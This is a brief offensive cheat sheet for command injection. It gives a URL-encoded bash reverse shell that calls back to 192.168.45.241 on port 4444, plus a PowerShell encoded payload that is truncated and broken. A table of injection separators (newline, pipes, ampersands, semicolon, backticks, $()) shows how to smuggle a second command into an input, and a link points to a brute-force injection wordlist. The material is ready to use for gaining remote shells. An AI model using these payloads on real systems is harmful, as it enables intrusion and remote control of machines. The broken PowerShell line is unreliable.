##### General payloads
```
// Linux (bash -c "bash -i >& /dev/tcp/192.168.45.241/4444 0>&1" --> URL Encode) 
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.241%2F4444%200%3E%261%22

// Windows (revshells.com --> powershell #4 --> URL Encode)
powershell%20-e%%3D%3D
```

##### Payload modifiers
| Payload | explanation | Windows | Linux |
| ---- | ---- | ---- | ---- |
| `%0A` | URL encoded newline, use when a command is ran, but validated. | x | x |
| \|\| | (double pipe) Executes both left and right side. | x | x |
| \| | (single pipe) Executes both left and right, pipes the left output into the right input. | x | x |
| `%26` | (single ampersand) Executes left and right, only the right output can get displayed. | x | x |
| `%26%26` | (double ampersand) Executes right if left finished successfully. | x | x |
| \` \` | Runs the inside command in `bash` |  | x |
| `;` | End the left commmand syntax abruptly, then executes the right command. |  | x |
| `$(PAYLOAD)` | Runs the payload in `bash`, similar to the \`\` . |  | x |

[Massive list of injections to bruteforce, might not give output](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt)
